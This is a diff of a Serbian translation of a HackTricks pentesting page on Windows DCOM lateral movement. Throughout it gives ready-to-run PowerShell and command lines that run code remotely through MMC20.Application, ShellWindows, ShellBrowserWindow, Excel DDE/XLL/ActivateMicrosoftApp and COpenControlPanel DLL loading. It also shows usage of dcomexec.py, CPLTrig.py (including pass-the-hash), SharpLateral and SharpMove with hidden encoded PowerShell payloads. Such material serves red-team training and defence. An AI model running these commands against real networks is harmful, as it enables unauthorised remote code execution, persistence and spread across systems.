@@ -2,16 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-DCOM lateral movement je privlačan jer ponovo koristi postojeće COM servere izložene preko RPC/DCOM-a, umesto kreiranja servisa ili scheduled task-a. U praksi to znači da početna konekcija obično počinje preko TCP/135, a zatim prelazi na dinamički dodeljene visoke RPC portove.
+DCOM lateral movement je privlačan jer ponovo koristi postojeće COM servere dostupne preko RPC/DCOM-a, umesto kreiranja servisa ili zakazanog zadatka. U praksi to znači da se početna veza obično uspostavlja preko TCP/135, a zatim prelazi na dinamički dodeljene RPC portove visokog opsega.
 
-## Prerequisites & Gotchas
+## Preduslovi i zamke
 
-- Obično vam je potreban kontekst lokalnog administratora na targetu, a udaljeni COM server mora dozvoliti remote launch/activation.
-- Od **14. marta 2023.**, Microsoft primenjuje DCOM hardening na podržanim sistemima. Stari klijenti koji zahtevaju nizak nivo authentication-a za activation mogu doživeti neuspeh osim ako ne pregovaraju najmanje `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Moderni Windows klijenti se obično automatski podižu na odgovarajući nivo, tako da aktuelni alati uglavnom nastavljaju da rade.<sup>[[3]](#references)</sup>
-- Ručno ili skriptovano DCOM izvršavanje uglavnom zahteva TCP/135 i targetov dinamički opseg RPC portova. Ako koristite Impacket-ov `dcomexec.py` i želite da dobijete izlaz komande, obično vam je potreban i SMB pristup ka `ADMIN$` (ili drugom share-u sa mogućnošću čitanja/upisivanja).
-- Ako RPC/DCOM funkcioniše, ali je SMB blokiran, `dcomexec.py -nooutput` i dalje može biti koristan za blind execution.
+- Obično vam je potreban lokalni administratorski kontekst na ciljnom sistemu, a udaljeni COM server mora da dozvoli udaljeno pokretanje/aktivaciju.
+- Od **14. marta 2023.** Microsoft sprovodi DCOM hardening na podržanim sistemima. Stari klijenti koji zatraže nizak nivo autentifikacije aktivacije mogu da zakažu, osim ako ne ugovore najmanje `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Savremeni Windows klijenti obično automatski podižu nivo, tako da aktuelni alati uglavnom i dalje rade.<sup>[[3]](#references)</sup>
+- Ručno ili skriptovano izvršavanje preko DCOM-a uglavnom zahteva TCP/135, kao i opseg dinamičkih RPC portova ciljnog sistema. Ako koristite Impacket-ov `dcomexec.py` i želite da dobijete izlaz komandi, obično vam je potreban i SMB pristup do `ADMIN$` (ili drugog deljenog resursa sa dozvolama za čitanje/upis).
+- Ako RPC/DCOM radi, ali je SMB blokiran, `dcomexec.py -nooutput` i dalje može biti koristan za slepo izvršavanje.
 
 Brze provere:
+
 ```bash
 # Enumerate registered DCOM applications
 Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name
@@ -19,54 +20,64 @@ Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name
 # Useful to inspect firewall/RPC issues
 Test-NetConnection -ComputerName 10.10.10.10 -Port 135
 ```
+
 ## MMC20.Application
 
-Za više informacija o ovoj tehnici pogledajte [originalni post o MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>
+Više informacija o ovoj tehnici potražite u [originalnoj objavi o MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>
 
-Distributed Component Object Model (DCOM) objekti pružaju zanimljivu mogućnost za interakciju sa objektima zasnovanu na mreži. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Component Object Model (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Lista DCOM aplikacija može se dobiti pomoću PowerShell komande:
+Objekti Distributed Component Object Model (DCOM) nude zanimljive mogućnosti za mrežnu interakciju s objektima. Microsoft pruža opširnu dokumentaciju o DCOM-u i Component Object Model-u (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Lista DCOM aplikacija može se dobiti pomoću PowerShell komande:
+
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava skriptovanje operacija MMC snap-inova. Značajno je da ovaj objekat sadrži metod `ExecuteShellCommand` u okviru `Document.ActiveView`. Više informacija o ovom metodu možete pronaći [ovde](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Proverite ga pokretanjem:<sup>[[6]](#references)</sup>
 
-Ova funkcija omogućava izvršavanje komandi preko mreže kroz DCOM aplikaciju. Za interakciju sa DCOM-om na daljinu kao admin, PowerShell se može koristiti na sledeći način:
+COM objekat [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) omogućava skriptovanje operacija MMC snap-inova. Značajno je to što ovaj objekat sadrži metodu `ExecuteShellCommand` u okviru `Document.ActiveView`. Više informacija o ovoj metodi možete pronaći [ovde](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Proverite kako radi:<sup>[[6]](#references)</sup>
+
+Ova funkcija omogućava izvršavanje komandi preko mreže putem DCOM aplikacije. Za daljinsku interakciju sa DCOM-om kao administrator, PowerShell se može koristiti ovako:
+
 ```bash
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
-Ova komanda se povezuje sa DCOM aplikacijom i vraća instancu COM objekta. Zatim se može pozvati metoda ExecuteShellCommand za izvršavanje procesa na remote hostu. Proces obuhvata sledeće korake:
+
+Ova komanda se povezuje sa DCOM aplikacijom i vraća instancu COM objekta. Zatim se može pozvati metod ExecuteShellCommand da bi se pokrenuo proces na udaljenom hostu. Proces obuhvata sledeće korake:
 
 Proverite metode:
+
 ```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
-Ostvarivanje RCE-a:
+
+Ostvarite RCE:
+
 ```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView.ExecuteShellCommand(
-"cmd.exe",
-$null,
-"/c powershell -NoP -W Hidden -Enc <B64>",
-"7"
+    "cmd.exe",
+    $null,
+    "/c powershell -NoP -W Hidden -Enc <B64>",
+    "7"
 )
 ```
-Poslednji argument predstavlja stil prozora. `7` održava prozor minimizovanim. Operativno, izvršavanje zasnovano na MMC-u obično dovodi do toga da udaljeni proces `mmc.exe` pokrene vaš payload, što se razlikuje od objekata zasnovanih na Explorer-u navedenih u nastavku.
+
+Poslednji argument je stil prozora. `7` ostavlja prozor minimizovanim. U praksi, izvršavanje zasnovano na MMC-u obično dovodi do toga da udaljeni proces `mmc.exe` pokrene vaš payload, što se razlikuje od objekata zasnovanih na Explorer-u u nastavku.
 
 ## ShellWindows & ShellBrowserWindow
 
-**Za više informacija o ovoj tehnici pogledajte originalnu objavu [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>
+**Više informacija o ovoj tehnici potražite u originalnoj objavi [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>
 
-Utvrđeno je da objekat **MMC20.Application** nema eksplicitne „LaunchPermissions“, već podrazumevano koristi permissions koje Administratorima omogućavaju pristup. Za više detalja, nit se može pogledati [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje alata OleView .NET autora [@tiraniddo](https://twitter.com/tiraniddo) za filtriranje objekata bez eksplicitne Launch Permission.
+Uočeno je da objekat **MMC20.Application** nema vrednost `LaunchPermission` specifičnu za aplikaciju.<sup>[[2]](#references)</sup> To samo po sebi ne daje pristup: COM proverava ACL `DefaultLaunchPermission` računara i ograničenja za pokretanje/pristup na nivou računara, kada su primenljiva.<sup>[[9]](#references)[[10]](#references)</sup> Za više detalja možete pogledati diskusiju [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se i korišćenje OleView .NET alata autora [@tiraniddo](https://twitter.com/tiraniddo) za filtriranje objekata bez eksplicitne dozvole za pokretanje (Launch Permission).
 
-Dva konkretna objekta, `ShellBrowserWindow` i `ShellWindows`, izdvojena su zbog nedostatka eksplicitnih Launch Permissions. Nepostojanje `LaunchPermission` registry unosa pod `HKCR:\AppID\{guid}` označava da ne postoje eksplicitne permissions.
+Dva konkretna objekta, `ShellBrowserWindow` i `ShellWindows`, izdvojena su zbog toga što nemaju eksplicitne dozvole za pokretanje.<sup>[[2]](#references)</sup> Odsustvo vrednosti `LaunchPermission` u okviru `HKCR:\AppID\{guid}` znači da ne postoji ACL za pokretanje specifičan za aplikaciju; to **ne** znači da je udaljena aktivacija neograničena.<sup>[[9]](#references)[[10]](#references)</sup>
 
-U poređenju sa objektom `MMC20.Application`, ovi objekti su često tiši iz OPSEC perspektive, jer komanda na udaljenom hostu obično završi kao child proces od `explorer.exe`, umesto od `mmc.exe`.
+U poređenju sa objektom `MMC20.Application`, ovi objekti su često tiši iz OPSEC perspektive, jer se komanda na udaljenom hostu obično pokreće kao podređeni proces `explorer.exe`, a ne `mmc.exe`.
 
 ### ShellWindows
 
-Za `ShellWindows`, koji nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` omogućavaju instanciranje objekta korišćenjem njegovog AppID-ja. Ovaj proces koristi OleView .NET za pronalaženje CLSID-ja objekta `ShellWindows`. Nakon instanciranja, interakcija je moguća putem metode `WindowsShell.Item`, što dovodi do pozivanja metode poput `Document.Application.ShellExecute`.
+Pošto `ShellWindows` nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` omogućavaju instanciranje objekta pomoću njegovog CLSID-a. U ovom procesu se koristi OleView .NET za pronalaženje CLSID-a objekta `ShellWindows`. Nakon instanciranja, moguće je komunicirati s objektom pomoću metode `WindowsShell.Item`, što omogućava pozivanje metoda kao što je `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>
 
-Dati su primeri PowerShell komandi za instanciranje objekta i udaljeno izvršavanje komandi:
+Prikazane su primer PowerShell komandi za instanciranje objekta i udaljeno izvršavanje komandi:
+
 ```bash
 # Example
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
@@ -74,67 +85,76 @@ $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
 ```
+
 ### ShellBrowserWindow
 
-`ShellBrowserWindow` je sličan, ali ga možete direktno instancirati putem njegovog CLSID-a i pivotovati na `Document.Application.ShellExecute`:
+`ShellBrowserWindow` je sličan, ali možete ga direktno instancirati preko njegovog CLSID-a i pivotirati na `Document.Application.ShellExecute`:
+
 ```bash
 $com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
 $obj = [System.Activator]::CreateInstance($com)
 $obj.Document.Application.ShellExecute(
-"cmd.exe",
-"/c whoami > C:\\Windows\\Temp\\dcom.txt",
-"C:\\Windows\\System32",
-$null,
-0
+    "cmd.exe",
+    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
+    "C:\\Windows\\System32",
+    $null,
+    0
 )
 ```
-### Lateral Movement sa Excel DCOM objektima
 
-Lateral movement se može ostvariti iskorišćavanjem Excel DCOM objekata. Za detaljne informacije preporučuje se da pročitate diskusiju o korišćenju Excel DDE-a za lateral movement putem DCOM-a na [Cybereason blogu](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>
+### Lateralno kretanje pomoću Excel DCOM objekata
 
-Empire projekat obezbeđuje PowerShell skriptu koja demonstrira korišćenje Excela za daljinsko izvršavanje koda (RCE) manipulisanjem DCOM objektima. U nastavku se nalaze isečci iz skripte dostupne u [Empire GitHub repozitorijumu](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode za zloupotrebu Excela radi RCE-a:
+Lateralno kretanje može se ostvariti iskorišćavanjem DCOM Excel objekata. Za detaljnije informacije preporučuje se da pročitate raspravu o korišćenju Excel DDE-a za lateralno kretanje putem DCOM-a na [blogu Cybereason-a](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>
+
+Projekat Empire nudi PowerShell skriptu koja demonstrira korišćenje Excel-a za udaljeno izvršavanje koda (RCE) manipulisanjem DCOM objektima. U nastavku su isečci iz skripte dostupne u [GitHub repozitorijumu projekta Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode za zloupotrebu Excel-a radi RCE-a:
+
 ```bash
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
-$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
-$Obj = [System.Activator]::CreateInstance($Com)
-$isx64 = [boolean]$obj.Application.ProductCode[21]
-Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
+    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+    $Obj = [System.Activator]::CreateInstance($Com)
+    $isx64 = [boolean]$obj.Application.ProductCode[21]
+    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
 }
 # Registration of an XLL
 elseif ($Method -Match "RegisterXLL") {
-$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
-$Obj = [System.Activator]::CreateInstance($Com)
-$obj.Application.RegisterXLL("$DllPath")
+    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+    $Obj = [System.Activator]::CreateInstance($Com)
+    $obj.Application.RegisterXLL("$DllPath")
 }
 # Execution of a command via Excel DDE
 elseif ($Method -Match "ExcelDDE") {
-$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
-$Obj = [System.Activator]::CreateInstance($Com)
-$Obj.DisplayAlerts = $false
-$Obj.DDEInitiate("cmd", "/c $Command")
+    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+    $Obj = [System.Activator]::CreateInstance($Com)
+    $Obj.DisplayAlerts = $false
+    $Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
-Nedavno istraživanje proširilo je ovu oblast metodom `ActivateMicrosoftApp()` objekta `Excel.Application`. Ključna ideja je da Excel može pokušati da pokrene legacy Microsoft aplikacije kao što su FoxPro, Schedule Plus ili Project pretraživanjem sistemskog `PATH`-a. Ako operator može da postavi payload sa jednim od očekivanih naziva u lokaciju sa mogućnošću upisivanja koja je deo `PATH`-a ciljnog sistema, Excel će ga izvršiti.<sup>[[4]](#references)</sup>
 
-Zahtevi za ovu varijaciju:
+Nedavna istraživanja proširila su ovu oblast metodom `ActivateMicrosoftApp()` iz `Excel.Application`. Ključna ideja je da Excel može pokušati da pokrene stare Microsoft aplikacije, kao što su FoxPro, Schedule Plus ili Project, tako što ih traži u sistemskoj promenljivoj `PATH`. Ako operator može da smesti payload pod jednim od očekivanih naziva u lokaciju u koju može da upisuje, a koja je deo `PATH`-a na meti, Excel će ga izvršiti.<sup>[[4]](#references)</sup>
 
-- Local admin na ciljnom sistemu
-- Excel instaliran na ciljnom sistemu
-- Mogućnost upisivanja payload-a u direktorijum sa mogućnošću upisivanja koji se nalazi u `PATH`-u ciljnog sistema
+Uslovi za ovu varijantu:
 
-Praktičan primer zloupotrebe FoxPro lookup-a (`FOXPROW.exe`):
+- Lokalni admin na meti
+- Excel instaliran na meti
+- Mogućnost upisa payloada u direktorijum na meti u koji može da se upisuje, a koji je deo `PATH`-a
+
+Praktičan primer zloupotrebe FoxPro pretrage (`FOXPROW.exe`):
+
 ```bash
 copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
 $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
 $com.ActivateMicrosoftApp("5")
 ```
-Ako napadački host nema registrovan lokalni `Excel.Application` ProgID, instancirajte udaljeni objekat pomoću CLSID-a:
+
+Ako lokalni `Excel.Application` ProgID nije registrovan na napadačkom hostu, instancirajte udaljeni objekat pomoću CLSID-a:
+
 ```bash
 $com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
 $com.Application.ActivateMicrosoftApp("5")
 ```
-Vrednosti za koje je u praksi uočena zloupotreba:
+
+Vrednosti za koje je u praksi primećena zloupotreba:
 
 - `5` -> `FOXPROW.exe`
 - `6` -> `WINPROJ.exe`
@@ -142,14 +162,17 @@ Vrednosti za koje je u praksi uočena zloupotreba:
 
 ### COpenControlPanel — učitavanje registrovanog Control Panel DLL-a
 
-Klasa `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) izlaže `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Njena metoda `Open()` uzrokuje da udaljeni `dllhost.exe` učita Control Panel DLL-ove registrovane pod ključem `Control Panel\Cpls`. Klasa na testiranim sistemima nema eksplicitne dozvole za pokretanje/pristup, pa nasleđuje podrazumevanu DCOM politiku (koja obično zahteva administratora za udaljenu aktivaciju). Nasumično ime stavke dovoljno je da metoda `Open()` obradi registrovane DLL-ove; payload ne mora imati ekstenziju `.cpl`, ali mora biti važeći DLL odgovarajuće arhitekture.<sup>[[7]](#references)</sup>
+Klasa `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) izlaže `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Njen metod `Open()` dovodi do toga da udaljeni `dllhost.exe` učita Control Panel DLL-ove registrovane pod ključem `Control Panel\Cpls`. Na testiranim sistemima klasa nema eksplicitno podešene dozvole za pokretanje/pristup, pa nasleđuje podrazumevanu DCOM politiku (koja obično zahteva administratorske privilegije za udaljenu aktivaciju). Naziv proizvoljne stavke dovoljan je da `Open()` obradi registrovane DLL-ove; payload ne mora imati ekstenziju `.cpl`, ali mora biti validan DLL odgovarajuće arhitekture.<sup>[[7]](#references)</sup>
 
-Ovaj primitive je **stage-and-trigger**, a ne izvršavanje samo komande: prvo kopirajte DLL na cilj i kreirajte vrednost `REG_EXPAND_SZ` koja pokazuje na njega, a zatim aktivirajte objekat preko DCOM-a. Na primer, iz administrativnog Windows konteksta:<sup>[[7]](#references)</sup>
+Ovaj primitive je **stage-and-trigger**, a ne samo izvršavanje komandi: prvo kopirajte DLL na cilj i kreirajte vrednost `REG_EXPAND_SZ` koja upućuje na njega, a zatim aktivirajte objekat preko DCOM-a. Na primer, iz administrativnog Windows konteksta:<sup>[[7]](#references)</sup>
+
 ```cmd
 copy payload.dll \\target\C$\Windows\Temp\panel.dll
 reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
 ```
-Javni [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) klijent implementira nedokumentovani DCOM poziv koristeći Impacket. Navođenje proizvoljnog naziva stavke Control Panel-a je dovoljno; klijent može prijaviti RPC grešku iako je `dllhost.exe` učitao DLL.<sup>[[8]](#references)</sup>
+
+Javni klijent [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) implementira nedokumentovani DCOM poziv pomoću Impacket-a. Dovoljno je navesti proizvoljan naziv stavke u Control Panel-u; klijent može prijaviti RPC grešku iako je `dllhost.exe` učitao DLL.<sup>[[8]](#references)</sup>
+
 ```bash
 git clone https://github.com/klsecservices/CPLDCOMTrigger
 cd CPLDCOMTrigger
@@ -159,29 +182,37 @@ python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random
 python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
 python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
 ```
-Operativno, ovaj put takođe zahteva kanal za upis datoteka i udaljeni pristup registru, pa je bučniji od `MMC20`/`ShellWindows`. Stvara sporedni efekat persistence-a jer kasnije otvaranje Control Panel-a može ponovo učitati isti unos. Uklonite vrednost nakon izvršavanja i tražite neočekivane vrednosti u `Control Panel\Cpls`, zajedno sa neuobičajenim učitavanjima DLL-ova u `dllhost.exe`.<sup>[[7]](#references)</sup>
+
+Operativno, ovaj put zahteva i kanal za upis datoteka i udaljeni pristup registru, pa je bučniji od `MMC20`/`ShellWindows`. Stvara sporedni efekat postojanosti jer kasnije otvaranje Control Panel-a može ponovo da učita isti unos. Uklonite vrednost nakon izvršavanja i potražite neočekivane vrednosti u `Control Panel\Cpls` zajedno sa neuobičajenim učitavanjima DLL-ova u `dllhost.exe`.<sup>[[7]](#references)</sup>
+
 ```cmd
 reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
 del \\target\C$\Windows\Temp\panel.dll
 ```
-### Alati za automatizaciju lateralnog kretanja
 
-Dva alata su istaknuta za automatizaciju ovih tehnika:
+### Alati za automatizaciju Lateral Movement-a
 
-- **Invoke-DCOM.ps1**: PowerShell skripta koju obezbeđuje projekat Empire i koja pojednostavljuje pozivanje različitih metoda za izvršavanje koda na udaljenim računarima. Ova skripta je dostupna u Empire GitHub repozitorijumu.
+Izdvojena su dva alata za automatizaciju ovih tehnika:
 
-- **SharpLateral**: Alat namenjen udaljenom izvršavanju koda, koji se može koristiti sledećom komandom:
+- **Invoke-DCOM.ps1**: PowerShell skripta koju obezbeđuje projekat Empire, a koja pojednostavljuje pozivanje različitih metoda za izvršavanje code-a na udaljenim mašinama. Skripta je dostupna u GitHub repozitorijumu projekta Empire.
+
+- **SharpLateral**: Alat namenjen za udaljeno izvršavanje code-a, koji se može koristiti pomoću sledeće komande:
+
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
+
 - [SharpMove](https://github.com/0xthirteen/SharpMove):
+
 ```bash
 SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
 ```
+
 ## Automatski alati
 
-- Powershell skripta [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) omogućava jednostavno pozivanje svih komentarisanim načinima opisanih načina za izvršavanje koda na drugim mašinama.
+- PowerShell skripta [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) omogućava jednostavno pozivanje svih navedenih načina za izvršavanje koda na drugim mašinama.
 - Možete koristiti Impacket-ov `dcomexec.py` za izvršavanje komandi na udaljenim sistemima pomoću DCOM-a. Trenutne verzije podržavaju `ShellWindows`, `ShellBrowserWindow` i `MMC20`, a podrazumevano koriste `ShellWindows`.
+
 ```bash
 dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
 
@@ -191,22 +222,33 @@ dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c who
 # Blind execution when SMB/output retrieval is not available
 dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
 ```
-- Takođe možete koristiti [**SharpLateral**](https://github.com/mertdas/SharpLateral):
+
+- Možete koristiti i [**SharpLateral**](https://github.com/mertdas/SharpLateral):
+
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
-- Takođe možete koristiti [**SharpMove**](https://github.com/0xthirteen/SharpMove)
+
+- Mogli biste da koristite i [**SharpMove**](https://github.com/0xthirteen/SharpMove)
+
 ```bash
 SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
 ```
+
+
+
+
+
 ## References
 
-- [1] [Lateral Movement korišćenjem MMC20.Application COM objekta](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
-- [2] [Lateral Movement putem DCOM-a: drugi krug](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
-- [3] [KB5004442—Upravljanje promenama za Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
-- [4] [Lateral Movement: Zloupotreba mogućnosti DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
-- [5] [Korišćenje Excel DDE za lateral movement putem DCOM-a](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
-- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
+- [1] [Bočno kretanje pomoću COM objekta MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
+- [2] [Bočno kretanje preko DCOM-a: drugi krug](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
+- [3] [KB5004442—Upravljanje promenama za zaobilaženje bezbednosne funkcije Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
+- [4] [Bočno kretanje: Iskoristite mogućnosti DCOM Excel aplikacije](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
+- [5] [Korišćenje Excel DDE-a za bočno kretanje preko DCOM-a](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
+- [6] [technet.microsoft.com - Klasa MMC aplikacije (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
 - [7] [Korišćenje DCOM objekata za udaljeno izvršavanje komandi](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
 - [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
+- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
+- [10] [MS-DCOM: Dodatak B, ponašanje proizvoda - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
 {{#include ../../banners/hacktricks-training.md}}
